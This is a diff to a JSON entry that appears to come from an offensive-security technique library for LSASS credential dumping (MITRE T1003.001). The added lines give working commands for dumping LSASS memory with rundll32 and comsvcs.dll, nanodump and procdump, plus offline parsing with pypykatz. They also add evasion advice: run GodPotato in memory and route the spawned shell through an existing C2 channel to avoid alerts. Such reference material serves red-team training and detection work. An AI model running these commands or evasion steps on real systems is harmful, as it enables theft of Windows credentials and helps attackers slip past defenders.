@@ -91,6 +91,35 @@
       "HTB M26",
       "MITRE T1003.001",
       "MITRE T1078"
-    ]
-  }
+    ],
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+  },
+  "variations": [
+    {
+      "label": "comsvcs.dll MiniDump (LOLBAS)",
+      "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full"
+    },
+    {
+      "label": "nanodump (evasive)",
+      "command": "nanodump.exe --write C:\\lsass.dmp"
+    },
+    {
+      "label": "Parse offline with pypykatz",
+      "command": "pypykatz lsa minidump lsass.dmp"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Confirm SeDebugPrivilege",
+      "command": "whoami /priv | findstr SeDebug"
+    },
+    {
+      "label": "Dump LSASS",
+      "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+    },
+    {
+      "label": "Exfil + parse offline (keeps mimikatz off the host)",
+      "command": "pypykatz lsa minidump lsass.dmp"
+    }
+  ]
 }
